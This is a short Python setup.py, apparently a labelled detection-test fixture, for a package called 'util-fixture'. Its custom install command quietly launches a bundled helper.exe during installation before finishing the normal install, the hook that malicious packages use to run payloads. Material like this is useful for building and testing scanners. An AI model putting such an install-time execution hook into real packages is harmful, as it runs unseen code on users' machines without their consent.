# FIXTURE ONLY - synthetic detection test sample, not real malware
import os
import subprocess

from setuptools import setup
from setuptools.command.install import install


class Install(install):
    def run(self):
        exe = os.path.join(os.path.dirname(__file__), "data", "helper.exe")
        subprocess.Popen([exe])
        install.run(self)


setup(name="util-fixture", version="0.0.2", cmdclass={"install": Install})
